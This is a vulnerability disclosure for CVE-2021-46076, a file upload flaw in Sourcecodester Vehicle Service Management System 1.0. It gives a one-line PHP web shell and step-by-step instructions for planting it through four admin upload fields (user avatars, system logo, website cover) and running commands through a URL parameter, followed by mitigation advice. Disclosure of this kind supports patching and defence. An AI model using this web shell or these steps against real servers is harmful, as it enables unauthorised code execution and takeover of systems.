# CVE-2021-46076

### Exploit Title: Vehicle Service Management System - 'Multiple' File upload Leads to Code Execution
### Exploit Author: <a href="https://www.plsanu.com">P.L.Sanu</a>
### CVE: CVE-2021-46076
### CVSS: 8.8 HIGH
### References: 
- https://www.plsanu.com/vehicle-service-management-system-multiple-file-upload-leads-to-code-execution
- https://nvd.nist.gov/vuln/detail/CVE-2021-46076
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-46076

### Description:
Sourcecodester Vehicle Service Management System 1.0 is vulnerable to File upload. An attacker can upload a malicious php file in multiple endpoints it leading to Code Execution.

### 1. Vehicle Service Management System - 'MyAccount' (/admin/?page=user)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to My Account section http://localhost/vehicle_service/admin/?page=user

### Payload:
```html
<?php system($_GET['cmd']);?>
```

3. Save the above php code For Ex:Cmd.php
4. In My Account Section enter all the required details and browse the php file in Avatar.
5. Click on update button.
6. Open the avatar image in new tab.
7. Add the cmd parameter in the URL and execute the commands.
8. Final URL: http://localhost/vehicle_service/uploads/1640632740_Cmd.php?cmd=whoami
9. Execute all the system commands For Ex: id, whoami, pwd etc..

### 2. Vehicle Service Management System - 'User List' (/admin/?page=user/manage_user)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to User List section and click on Create New button.

### Payload:
```html
<?php system($_GET['cmd']);?>
```

3. Save the above php code For Ex:Cmd.php
4. In Create New User Page enter all the required details and browse the php file in Avatar.
5. Click on Save button.
6. Open the avatar image in new tab.
7. Add the cmd parameter in the URL and execute the commands.
8. Final URL: http://localhost/vehicle_service/uploads/1640632740_Cmd.php?cmd=whoami
9. Execute all the system commands For Ex: id, whoami, pwd etc..

### 3. Vehicle Service Management System - 'Settings-System Logo' (/admin/?page=system_info)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info

### Payload:
```html
<?php system($_GET['cmd']);?>
```

3. Save the above php code For Ex:Cmd.php
4. In Settings Section enter all the required details and browse the php file in System Logo.
5. Click on update button.
6. Open the System Logo image in new tab.
7. Add the cmd parameter in the URL and execute the commands.
8. Final URL: http://localhost/vehicle_service/uploads/1640632740_Cmd.php?cmd=whoami
9. Execute all the system commands For Ex: id, whoami, pwd etc..

### 4. Vehicle Service Management System - 'Settings-Website Cover' (/admin/?page=system_info)

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info

### Payload:
```html
<?php system($_GET['cmd']);?>
```

3. Save the above php code For Ex:Cmd.php
4. In Settings Section enter all the required details and browse the php file in Website Cover.
5. Click on update button.
6. Open the Website Cover image in new tab.
7. Add the cmd parameter in the URL and execute the commands.
8. Final URL: http://localhost/vehicle_service/uploads/1640632740_Cmd.php?cmd=whoami
9. Execute all the system commands For Ex: id, whoami, pwd etc..

### Impact:
An attacker can able to upload malicious php file in multiple endpoints it leads to Code Execution.

### Mitigation:
It is recommended to implement the following:
- Never accept a filename and its extension directly without having a white-list filter.
- If there is no need to have Unicode characters, it is highly recommended to only accept alpha-numeric characters and only one dot as an input for the file name and the extension.
- Limit the file size to a maximum value in order to prevent denial of service attacks.
- Uploaded directory should not have any "execute" permission.
- Don't rely on client-side validation only.
